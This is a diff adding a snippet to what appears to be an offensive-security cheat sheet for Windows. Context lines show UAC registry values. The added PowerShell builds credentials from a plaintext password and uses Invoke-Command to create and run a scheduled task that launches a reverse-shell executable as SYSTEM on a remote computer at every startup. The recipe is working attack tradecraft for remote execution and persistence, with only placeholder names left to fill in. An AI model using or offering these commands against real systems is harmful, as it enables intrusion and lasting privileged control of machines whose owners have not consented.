@@ -3506,6 +3506,15 @@ EnableLUA : 1
 ConsentPromptBehaviorAdmin : 5
 ## 0 = don't prompt, 1 = prompt
 PromptOnSecureDesktop : 1
+
+# run scheduled task as user_name_here (e.g. Administrator)
+## configure creds
+$pwd = ConvertTo-SecureString "password_here" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("username_here", $pwd)
+## set up scheduled task
+Invoke-Command -Computer computer_name_here -ScriptBlock { schtasks /create /sc onstart /tn task_name_here /tr C:\path\to\revshell.exe /ru SYSTEM } -Credential $creds
+## run scheduled task
+Invoke-Command -Computer computer_name_here -ScriptBlock { schtasks /run /tn task_name_here } -Credential $creds
 ```
 
 
